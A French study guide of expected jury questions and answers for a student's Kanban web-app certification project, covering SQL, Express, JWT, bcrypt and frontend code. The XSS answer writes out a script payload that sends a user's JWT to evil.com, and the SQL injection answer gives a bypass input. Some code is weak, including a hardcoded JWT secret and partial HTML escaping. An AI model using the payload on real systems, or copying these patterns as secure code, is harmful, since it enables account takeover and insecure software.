PARTIE 1 — Présentation du projet

Les premières questions posées à tous les candidats

1 Présente ton projet en 2 minutes. FACILE +
Ce que tu dis :
"Lumina Pro est une application web de gestion de tâches collaborative basée sur la méthode Kanban. Elle permet à une équipe de créer des colonnes personnalisées, d'y ajouter des tâches avec un niveau de priorité, de les assigner à des membres, et de les déplacer d'une colonne à l'autre. Il y a deux types d'utilisateurs : l'admin qui gère l'équipe et les colonnes, et l'utilisateur normal qui gère les tâches. L'application est sécurisée par JWT pour l'authentification et bcrypt pour les mots de passe."
2 Quelle est la stack technique de ton projet ? FACILE +
Frontend : HTML5, CSS3 modulaire (8 fichiers), JavaScript ES6+ Vanilla (8 modules)
Backend : Node.js, Express 5
Base de données : MySQL 8
Sécurité : jsonwebtoken, bcrypt, requêtes préparées
Documentation : Swagger UI
Versioning : Git + GitHub

Ne pas oublier de mentionner que le frontend et le backend sont séparés et communiquent via une API REST.
3 C'est quoi la méthode Kanban ? FACILE +
Le Kanban est une méthode de gestion de projet visuelle. On organise le travail en colonnes qui représentent des états (À faire → En cours → Terminé). Chaque tâche est une carte qu'on déplace d'une colonne à l'autre au fur et à mesure de son avancement. Ça vient du système de production Toyota. Ça permet de voir en un coup d'œil l'état d'avancement de tout le projet.
4 Pourquoi tu as choisi Vanilla JS et pas React ou Vue ? MOYEN +
J'ai voulu maîtriser les fondamentaux avant d'utiliser un framework. Vanilla JS m'oblige à comprendre le DOM, les événements, le fetch, le cycle de vie d'une page. Les frameworks comme React rajoutent une couche d'abstraction — si on ne comprend pas ce qu'ils font en dessous, on ne sait pas déboguer. Pour une application de cette taille, Vanilla JS est parfaitement adapté sans la complexité d'un build system.
5 C'est quoi une architecture client-serveur ? FACILE +
C'est une séparation en deux parties :
• Le client (navigateur) : ce que l'utilisateur voit et avec quoi il interagit. Il envoie des requêtes HTTP.
• Le serveur : reçoit les requêtes, traite la logique métier, interroge la base de données, renvoie des données JSON.
Dans Lumina Pro : le frontend est le client, Node.js/Express est le serveur. Ils communiquent via des requêtes HTTP avec des données au format JSON.

PARTIE 2 — Base de données

Structure SQL, relations, clés étrangères

6 Décris les tables de ta base de données et leurs relations. MOYEN +
4 tables :
• users (id, name, email UNIQUE, password, role ENUM admin/user)
• columns (id, title, position — pour l'ordre d'affichage)
• tasks (id, title, description, priority, id_assigned, id_col, created_at)
• logs (id, action, details, created_at — pour la traçabilité)

Relations : tasks.id_col → columns.id (avec ON DELETE CASCADE). tasks.id_assigned → users.id (sans cascade — une tâche peut exister sans être assignée).
7 Qu'est-ce qu'une clé étrangère (FOREIGN KEY) ? FACILE +
Une clé étrangère est une colonne qui fait référence à la clé primaire d'une autre table. Elle garantit l'intégrité référentielle : impossible d'insérer une valeur qui n'existe pas dans la table de référence. Dans Lumina Pro, id_col dans tasks fait référence à id dans columns — on ne peut pas créer une tâche dans une colonne qui n'existe pas.
8 Qu'est-ce que ON DELETE CASCADE ? Quand tu l'as utilisé ? MOYEN +
ON DELETE CASCADE signifie que si on supprime un enregistrement parent, tous les enfants sont supprimés automatiquement. J'ai utilisé ça sur la relation tasks → columns : si on supprime une colonne Kanban, toutes ses tâches sont supprimées en cascade par MySQL. Je n'ai pas besoin d'écrire une deuxième requête DELETE.
FOREIGN KEY (id_col) REFERENCES columns(id) ON DELETE CASCADE
9 C'est quoi la différence entre LEFT JOIN et INNER JOIN ? DIFFICILE +
INNER JOIN : ne retourne que les lignes qui ont une correspondance dans LES DEUX tables.
LEFT JOIN : retourne TOUTES les lignes de la table de gauche, même s'il n'y a pas de correspondance à droite (le champ est alors NULL).

Dans Lumina Pro, j'utilise LEFT JOIN entre tasks et users :
SELECT tasks.*, users.name as assigned_name FROM tasks LEFT JOIN users ON tasks.id_assigned = users.id
Si une tâche n'est pas assignée (id_assigned = NULL), INNER JOIN la ferait disparaître. LEFT JOIN la conserve avec assigned_name = NULL, et j'affiche "Non assigné".
10 Comment sont créées les tables dans ton projet ? FACILE +
Les tables sont créées automatiquement au premier démarrage du serveur Node.js avec CREATE TABLE IF NOT EXISTS. Si les tables existent déjà, la requête ne fait rien (grâce à IF NOT EXISTS). Les 3 colonnes par défaut (À faire, En cours, Terminé) sont aussi insérées automatiquement si la table colonnes est vide.
11 Pourquoi l'email a une contrainte UNIQUE dans la table users ? FACILE +
Parce que l'email sert d'identifiant de connexion. Si deux utilisateurs pouvaient avoir le même email, le serveur ne saurait pas lequel authentifier lors du login. La contrainte UNIQUE en base de données empêche l'insertion d'un email déjà existant — si on essaie, MySQL retourne une erreur, et le serveur répond "L'email existe peut-être déjà."
12 C'est quoi les propriétés ACID ? DIFFICILE +
ACID = garanties d'une transaction de base de données :
• Atomicité : tout ou rien — si une transaction échoue en cours, tout est annulé
• Consistance : la BDD passe d'un état valide à un autre état valide (les contraintes sont respectées)
• Isolation : les transactions simultanées ne se perturbent pas
• Durabilité : une fois validée, la transaction est permanente même en cas de panne

MySQL (InnoDB) supporte ACID. Dans Lumina Pro, quand j'insère une tâche, si l'INSERT échoue, rien n'est enregistré.

PARTIE 3 — Backend Node.js / Express

server.js, routes, middlewares

13 C'est quoi Express.js ? FACILE +
Express est un framework minimaliste pour Node.js qui simplifie la création de serveurs web et d'APIs REST. Il gère le routage (définir quelles fonctions répondent à quelles URLs), les middlewares (fonctions intermédiaires), et la gestion des requêtes/réponses HTTP. Sans Express, il faudrait tout écrire avec le module http natif de Node.js, ce qui est beaucoup plus verbeux.
14 C'est quoi un middleware ? Donne un exemple dans ton code. MOYEN +
Un middleware est une fonction qui s'exécute entre la réception de la requête et l'envoi de la réponse. Elle reçoit (req, res, next). Si elle appelle next(), on passe au middleware suivant. Si elle appelle res.json(), on s'arrête là.

Dans mon projet, verifyToken est un middleware : il vérifie le JWT avant chaque route protégée. Si le token est valide → next(). Si non → res.status(401) et la route ne s'exécute jamais.
Aussi : app.use(express.json()) est un middleware intégré qui parse le corps JSON des requêtes pour rendre req.body accessible.
15 C'est quoi CORS ? Pourquoi tu en as besoin ? MOYEN +
CORS = Cross-Origin Resource Sharing. Par sécurité, les navigateurs bloquent les requêtes JavaScript vers un domaine/port différent de la page courante. Mon frontend tourne sur le port 5500 (Live Server) et mon backend sur le port 3000 — deux origines différentes. Sans app.use(cors()), le navigateur bloquerait toutes les requêtes fetch() avec une erreur "blocked by CORS policy". Le middleware cors() ajoute les bons headers HTTP pour autoriser cette communication.
16 C'est quoi req.body, req.params, req.user ? MOYEN +
• req.body : contenu JSON envoyé dans le corps de la requête (POST/PUT). Exemple : { title: "Nouvelle tâche", priority: "high" }. Disponible grâce à express.json().
• req.params : valeurs dans l'URL. Pour la route /api/tasks/:id, si on appelle /api/tasks/5, alors req.params.id = "5".
• req.user : données décodées du JWT, attachées par mon middleware verifyToken. Contient { id: 1, role: "admin" }. Permet aux routes de savoir qui fait la requête.
17 C'est quoi une API REST ? Quels sont ses principes ? MOYEN +
REST = Representational State Transfer. Principes :
• Chaque ressource a une URL unique (/api/tasks, /api/columns)
• Les opérations utilisent les méthodes HTTP : GET (lire), POST (créer), PUT (modifier), DELETE (supprimer)
• Le serveur est stateless : il ne mémorise pas les sessions. Toutes les infos nécessaires sont dans la requête (d'où le JWT dans chaque header)
• Les réponses sont en JSON

Dans Lumina Pro : GET /api/tasks = lire les tâches, POST /api/tasks = créer, PUT /api/tasks/5 = modifier la tâche 5, DELETE /api/tasks/5 = supprimer.
18 Pourquoi tu attaches req.db dans un middleware au lieu de l'importer directement ? DIFFICILE +
J'ai un middleware dans server.js qui fait req.db = db avant chaque requête. Ainsi toutes les routes (dans des fichiers séparés comme tasks.js, columns.js) peuvent accéder à la connexion BDD via req.db.query() sans avoir à importer le fichier de connexion dans chaque fichier. C'est un moyen d'injecter une dépendance partagée facilement.
app.use((req, res, next) => { req.db = db; next(); });
19 C'est quoi async/await ? Pourquoi tu l'utilises ? MOYEN +
JavaScript est mono-thread : une seule chose à la fois. Les requêtes réseau prennent du temps. Sans async/await, il faudrait des callbacks imbriqués (le fameux "callback hell") ou des .then().catch(). async/await rend le code asynchrone lisible comme du code synchrone.

async devant une fonction dit qu'elle peut contenir des opérations asynchrones.
await met en pause CETTE fonction (pas le reste du programme) jusqu'à recevoir le résultat.

Exemple : const response = await authFetch('/api/tasks') attend la réponse du serveur avant de continuer.
20 Explique la construction dynamique de la requête UPDATE dans tasks.js. DIFFICILE +
La même route PUT /api/tasks/:id sert pour modifier le titre/description ET pour déplacer une tâche (changer id_col). Je construis le UPDATE dynamiquement selon ce qui est envoyé :
let sql = "UPDATE tasks SET "; let params = []; if (title) { sql += "title = ?, "; params.push(title); } if (id_col) { sql += "id_col = ?, "; params.push(id_col); } sql = sql.slice(0, -2); // enlève la dernière virgule sql += " WHERE id = ?"; params.push(taskId);
Avantage : une seule route au lieu d'en créer une pour chaque cas. Sécurité : les valeurs sont toujours dans params avec des ? (requête préparée).

PARTIE 4 — Sécurité

JWT, bcrypt, XSS, injection SQL — le cœur de l'examen

21 C'est quoi JWT ? Que contient un token ? MOYEN +
JWT = JSON Web Token. Chaîne en 3 parties séparées par des points : header.payload.signature
• Header : algorithme utilisé { "alg": "HS256", "typ": "JWT" }
• Payload : données { "id": 1, "role": "admin", "iat": ..., "exp": ... }
• Signature : HMACSHA256(base64(header)+"."+base64(payload), clé_secrète)

La signature garantit l'intégrité : si quelqu'un modifie le payload pour se donner le rôle admin, la signature ne correspond plus et jwt.verify() lève une erreur.
Dans Lumina Pro le token expire après 24h.
22 Explique jwt.sign() et jwt.verify(). MOYEN +
// Création du token (après login réussi) const token = jwt.sign( { id: user.id, role: user.role }, // payload "LUMINA_SECRET_2024", // clé secrète { expiresIn: '24h' } // durée de vie );
// Vérification du token (dans verifyToken middleware) const decoded = jwt.verify(token, "LUMINA_SECRET_2024"); // decoded = { id: 1, role: 'admin', iat: ..., exp: ... } // Lance une exception si token falsifié ou expiré
jwt.sign() crée le token. jwt.verify() vérifie la signature ET la date d'expiration.
23 C'est quoi bcrypt ? Pourquoi pas MD5 ? MOYEN +
bcrypt est un algorithme de hachage de mots de passe volontairement lent. MD5 et SHA256 sont rapides — un attaquant peut tester des milliards de mots de passe par seconde. bcrypt est conçu pour être lent grâce au "cost factor" (10 dans mon projet) qui contrôle le nombre de cycles.

De plus, bcrypt génère automatiquement un sel (chaîne aléatoire unique) pour chaque mot de passe, rendant les rainbow tables inutiles. Même si deux utilisateurs ont le même mot de passe, leurs hashs seront différents.
24 Explique bcrypt.hash() et bcrypt.compare() dans ton code. MOYEN +
// INSCRIPTION : on hache le mot de passe avant de le stocker const hashedPassword = await bcrypt.hash(password, 10); // "Lumina1!" → "$2b$10$xK9mPqwerty..." (hash irréversible) // Le 10 = cost factor (10 cycles de hachage)
// CONNEXION : on compare le mot de passe saisi avec le hash stocké const isMatch = await bcrypt.compare(password, user.password); // compare("Lumina1!", "$2b$10$xK9mP...") → true ou false // On ne peut PAS retrouver le mot de passe depuis le hash
On ne stocke JAMAIS le mot de passe en clair en base de données.
25 C'est quoi une injection SQL ? Comment tu t'en protèges ? DIFFICILE +
Une injection SQL c'est quand un attaquant insère du code SQL dans un champ de saisie pour manipuler la base de données.
Exemple sans protection : SELECT * FROM users WHERE email = '${email}'
Si l'attaquant saisit ' OR '1'='1, la requête devient : SELECT * FROM users WHERE email = '' OR '1'='1' → retourne TOUS les utilisateurs.

Ma protection : requêtes préparées avec ?
const sql = "SELECT * FROM users WHERE email = ?"; req.db.query(sql, [email]); // mysql2 échappe les guillemets
Le driver mysql2 traite les ? comme des données texte, jamais comme du code SQL. Les guillemets sont échappés automatiquement.
26 C'est quoi une attaque XSS ? Comment tu t'en protèges ? DIFFICILE +
XSS = Cross-Site Scripting. Un attaquant crée une tâche avec un titre malveillant : <script>fetch('evil.com?token='+localStorage.getItem('token'))</script>. Sans protection, ce code s'exécuterait dans le navigateur de chaque utilisateur qui voit le tableau, et volerait leur token JWT.

Ma protection : escapeHTML()
function escapeHTML(str) { return str.replace(/</g, '&lt;') // < → ne s'exécute plus .replace(/>/g, '&gt;') // ... }
J'applique escapeHTML() sur toutes les données utilisateur avant de les injecter dans le HTML : titres, descriptions, noms.
27 Quelle est la différence entre 401 et 403 ? FACILE +
• 401 Unauthorized : "Qui es-tu ?" — le token est absent ou mal formaté. Tu n'es pas authentifié. Dans mon code : si le header Authorization est manquant.
• 403 Forbidden : "Je te connais mais non." — le token est présent mais invalide ou expiré. Dans mon code : si jwt.verify() lève une exception.

Moyen mnémotechnique : 401 = pas de ticket, 403 = ticket invalide.
28 Le JWT est chiffré ? N'importe qui peut lire le payload ? DIFFICILE +
Non, le JWT n'est PAS chiffré — il est encodé en Base64. N'importe qui peut décoder le payload sans connaître la clé secrète. Sur jwt.io on peut voir le contenu du token.

Ce qui est sécurisé c'est la signature : sans la clé secrète, on ne peut pas créer ou modifier un token valide. Donc même si quelqu'un lit { id: 1, role: "user" }, il ne peut pas le modifier en { role: "admin" } car ça invaliderait la signature.

C'est pourquoi on ne met JAMAIS d'informations sensibles (mot de passe, numéro de carte) dans le payload d'un JWT.
29 Qu'est-ce que le localStorage ? Quel risque pour le JWT ? MOYEN +
Le localStorage est un espace de stockage clé-valeur dans le navigateur. Les données persistent même après fermeture du navigateur. Dans mon projet je stocke le token JWT et les infos user.

Risque : le localStorage est accessible en JavaScript. Si une attaque XSS réussit (code injecté sur la page), l'attaquant peut faire localStorage.getItem('token') et voler le token.

Alternative plus sûre en production : les cookies HttpOnly que JavaScript ne peut pas lire, même en cas de XSS. Dans ce projet j'ai fait le choix du localStorage pour la simplicité.
30 Qu'est-ce que tu aurais amélioré en production ? DIFFICILE +
  • Fichier .env : stocker la clé secrète JWT dans une variable d'environnement (jamais dans le code)
  • HTTPS : chiffrer les communications pour que les tokens ne transitent pas en clair
  • Cookies HttpOnly : stocker le JWT dans un cookie inaccessible à JavaScript (résistant au XSS)
  • Rate limiting : limiter les tentatives de connexion pour bloquer les attaques brute force
  • Vérification du rôle côté serveur : vérifier req.user.role avant les actions d'admin
  • Validation des entrées : vérifier longueur minimale/maximale des champs

PARTIE 5 — Frontend JavaScript

DOM, fetch, fonctions clés

31 Explique authFetch(). Pourquoi cette fonction existe ? MOYEN +
authFetch() est un wrapper (enveloppe) autour de fetch() qui ajoute automatiquement le header Authorization avec le token JWT. Sans cette fonction, il faudrait écrire le header dans chaque appel fetch() — dans tasks.js, kanban.js, columns.js, team.js...

C'est le principe DRY (Don't Repeat Yourself) : centraliser ce qui se répète. Si le format du token change, on ne modifie qu'à un seul endroit.

Bonus : elle gère automatiquement le 401 (token expiré) en vidant le localStorage et redirigeant vers login.html.
32 Explique filter(), map(), join() dans renderBoard(). MOYEN +
// filter() : sélectionne les tâches de la colonne courante const colTasks = tasks.filter(t => t.id_col === col.id); // map() : transforme chaque tâche en chaîne HTML const html = colTasks.map(task => `<div class="task-card">${task.title}</div>`); // join('') : colle tout sans virgule board.innerHTML = html.join('');
filter() = garder certains éléments selon une condition.
map() = transformer chaque élément (objet tâche → HTML).
join('') = assembler les chaînes en une seule, sans le "," par défaut de toString().

Exemple sans map/join : il faudrait une boucle for avec une variable htmlString += à chaque tour.
33 Comment fonctionne le déplacement d'une tâche ? FACILE +
Chaque carte de tâche a des boutons ⬅️ et ➡️. Ces boutons appellent moveTask(taskId, newColId) avec l'ID de la colonne adjacente. La fonction envoie un PUT /api/tasks/:id avec { id_col: newColId }. Le serveur met à jour la colonne dans la BDD. Ensuite fetchTasks() recharge tout le tableau pour afficher la tâche à sa nouvelle position.
async function moveTask(taskId, newColId) { await authFetch(`http://localhost:3000/api/tasks/${taskId}`, { method: 'PUT', body: JSON.stringify({ id_col: newColId }) }); fetchTasks(); // rafraîchit l'affichage }
34 Comment gères-tu la création vs la modification d'une tâche avec le même formulaire ? MOYEN +
J'utilise un champ caché <input type="hidden" id="task-id"> dans le formulaire. S'il est vide → c'est une création (POST). S'il contient un ID → c'est une modification (PUT).
const id = document.getElementById('task-id').value; const method = id ? 'PUT' : 'POST'; const url = id ? `/api/tasks/${id}` : '/api/tasks';
Quand on clique sur ✏️ d'une tâche, editTask() remplit le formulaire avec les données existantes et met l'ID dans le champ caché. Quand on clique sur le bouton "+" pour créer, resetTaskForm() vide l'ID.
35 C'est quoi DOMContentLoaded ? Pourquoi tu l'utilises ? FACILE +
DOMContentLoaded est un événement qui se déclenche quand le HTML est entièrement chargé et parsé (mais pas forcément les images). On l'utilise pour s'assurer que les éléments HTML existent avant d'essayer de les manipuler en JavaScript. Sans ça, document.getElementById('user-name') retournerait null si le script s'exécute avant que le HTML soit prêt.
36 Comment fonctionne la gestion des rôles côté frontend ? MOYEN +
Au chargement de index.html, on lit les infos de l'utilisateur depuis localStorage (stockées lors du login) :
const user = JSON.parse(localStorage.getItem('user')); if (user.role === 'admin') { document.getElementById('nav-team').style.display = 'block'; } else { document.getElementById('nav-team').style.display = 'none'; }
L'onglet "Équipe" est affiché seulement pour l'admin. Attention : cette vérification frontend est visuelle uniquement. La vraie sécurité est sur le serveur : même si un utilisateur normal manipule le DOM pour afficher l'onglet, le serveur refusera la requête GET /api/users car verifyToken ne peut pas vérifier le rôle (il n'y a pas de vérification de rôle côté serveur dans cette version du projet).

PARTIE 6 — Questions pièges et difficiles

Ce que les jurys adorent demander pour tester la vraie compréhension

37 Si je vole le token JWT d'un utilisateur, qu'est-ce que je peux faire ? DIFFICILE +
Avec le token JWT volé, tu peux faire toutes les requêtes que l'utilisateur peut faire : lire ses tâches, créer/modifier/supprimer des tâches, voir l'équipe si c'est un admin. Le serveur ne peut pas distinguer "l'utilisateur réel" d'un "attaquant avec le token" car il vérifie seulement la validité du token, pas l'IP ou le device.

Limites de l'attaque : le token expire après 24h, donc l'accès est temporaire. En production, on peut invalider les tokens en les blacklistant côté serveur.
38 Est-ce que ton application est vraiment sécurisée ? Quelles failles restent ? DIFFICILE +
Ce qui est sécurisé : SQL injection (requêtes préparées), XSS (escapeHTML), mots de passe (bcrypt), authentification (JWT).

Ce qui manque pour une vraie production :
• Clé secrète JWT dans le code source (devrait être dans .env)
• Pas de HTTPS (tokens en clair sur le réseau)
• JWT dans localStorage (vulnérable au XSS, mieux : cookie HttpOnly)
• Pas de rate limiting (brute force sur le login possible)
• Pas de vérification du rôle côté serveur pour les actions admin

Ce projet est un MVP pour la certification, pas une application de banque.
39 C'est quoi CSRF ? Est-ce que ton application est vulnérable ? DIFFICILE +
CSRF = Cross-Site Request Forgery. Un site malveillant fait faire des requêtes à l'insu de l'utilisateur vers un site où il est connecté (en exploitant les cookies de session).

Mon application est protégée naturellement car j'utilise JWT dans le header Authorization (pas dans un cookie). Un site malveillant ne peut pas accéder au localStorage d'un autre domaine. Il ne peut donc pas mettre le token dans le header. Les navigateurs bloquent la lecture du localStorage cross-origin.
40 Quelle est la différence entre hachage et chiffrement ? DIFFICILE +
Hachage (bcrypt) : fonction à sens unique, irréversible. "Lumina1!" → "$2b$10$..." On ne peut pas retrouver le mot de passe depuis le hash. Utilisé pour les mots de passe.

Chiffrement (AES, RSA) : réversible avec la bonne clé. "Bonjour" chiffré avec clé "secret" → "xK9mP...". Avec la clé, on peut déchiffrer. Utilisé pour les données qu'on veut pouvoir relire (messages, fichiers).

Erreur à ne pas faire : dire "bcrypt chiffre le mot de passe". Il le hache — c'est différent et intentionnel.
41 Si la base de données est volée, les mots de passe sont-ils compromis ? DIFFICILE +
Non directement. La base contient des hashs bcrypt comme $2b$10$xK9mPqwerty.... On ne peut pas retrouver "Lumina1!" à partir du hash (irréversible).

L'attaquant pourrait faire une attaque par dictionnaire : tester des milliers de mots de passe courants avec bcrypt.compare(). Mais bcrypt est volontairement lent — à 10 rounds, chaque vérification prend ~100ms. Pour tester 1 million de mots de passe : 100 000 secondes (~28 heures). Avec un bon mot de passe (majuscule + chiffre + symbole), c'est pratiquement impossible.
42 Pourquoi utiliser ENUM pour le rôle et la priorité ? MOYEN +
ENUM contraint les valeurs acceptées. Pour le rôle : seulement 'admin' ou 'user'. Pour la priorité : seulement 'high', 'medium', 'low'. MySQL refuse toute autre valeur — un attaquant ne peut pas insérer role='superadmin'. C'est une validation au niveau de la base de données, en plus de la validation applicative.
43 Pourquoi les tâches ont les badges URGENT/MOYEN/NORMAL et non pas les vraies valeurs high/medium/low ? FACILE +
C'est une séparation entre les données techniques (high/medium/low en anglais en base de données) et l'affichage utilisateur (URGENT/MOYEN/NORMAL en français). Dans renderBoard() je fais une transformation :
task.priority === 'high' ? 'URGENT' : task.priority === 'medium' ? 'MOYEN' : 'NORMAL'
Avantage : si demain on veut changer l'interface en espagnol, on change seulement le frontend. La base de données reste inchangée.
44 C'est quoi le principe SOLID ou DRY ? DIFFICILE +
DRY = Don't Repeat Yourself : éviter la duplication de code. Si on change une logique, on ne la change qu'à un seul endroit. Exemple dans mon projet : authFetch() centralise l'ajout du header JWT au lieu de le répéter dans chaque fetch().

SOLID = 5 principes de conception orientée objet :
• S = Single Responsibility (une fonction, une responsabilité)
• O = Open/Closed
• L = Liskov Substitution
• I = Interface Segregation
• D = Dependency Inversion

Dans mon projet, j'applique surtout S et D : chaque fichier JS a un rôle unique (api.js = fetch, tasks.js = CRUD tâches, etc.).
45 C'est quoi Swagger ? Comment tu l'as utilisé ? MOYEN +
Swagger UI est une interface web qui documente et permet de tester une API REST. J'ai créé un fichier swagger.json qui décrit tous mes endpoints (URLs, méthodes HTTP, paramètres, réponses). En ajoutant app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument)) dans server.js, une page interactive est disponible sur http://localhost:3000/api-docs.

Ça m'a permis de tester les routes sans avoir à écrire du code JavaScript côté frontend — pratique pour déboguer le backend.

47 Quelles difficultés as-tu rencontrées pendant le développement ? MOYEN +
Plusieurs difficultés concrètes :
• CORS : au début toutes mes requêtes échouaient — j'ai dû comprendre pourquoi les ports différents posent problème et ajouter le middleware cors()
• async/await : comprendre que await ne bloque pas tout le programme mais seulement la fonction courante
• La requête UPDATE dynamique : construire une requête SQL qui peut modifier n'importe quelle combinaison de champs
• Le LEFT JOIN : comprendre pourquoi INNER JOIN faisait disparaître les tâches non assignées

J'utiliserais :
• Des variables d'environnement .env dès le départ pour les secrets
• TypeScript pour avoir des erreurs de type à la compilation

• Une meilleure gestion des erreurs côté frontend avec des messages plus précis pour l'utilisateur
49 C'est quoi un MCD, MLD, MPD ? MOYEN +
Les 3 étapes de modélisation d'une base de données :
• MCD (Modèle Conceptuel des Données) : niveau abstrait, entités et associations sans technique. Ex: UTILISATEUR — possède — TÂCHE
• MLD (Modèle Logique des Données) : on traduit en tables et colonnes. Ex: users(id, name, email), tasks(id, title, id_user)
• MPD (Modèle Physique des Données) : le SQL réel avec les types, contraintes, index. C'est ce qu'on écrit dans CREATE TABLE.
